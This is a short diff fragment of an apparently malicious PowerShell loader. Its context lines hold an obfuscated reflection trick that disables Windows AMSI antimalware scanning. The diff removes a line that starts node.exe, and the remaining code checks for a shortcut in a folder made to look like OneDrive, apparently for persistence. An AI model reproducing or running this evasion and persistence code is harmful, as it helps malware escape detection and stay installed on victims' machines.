@@ -28,7 +28,6 @@ $Pop = [Ref].Assembly.GetType("$Sys.$Mgmt.$Auto.$Utils")
 $nopLeep = $Pop.$GetField($zep, "$NonPublic,$Static")
 $nopLeep.SetValue($NullVal, $TrueVal)
 
-start .\node.exe
 $googoogaagaa = "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"
 if (-Not (Test-Path $googoogaagaa)) {
 
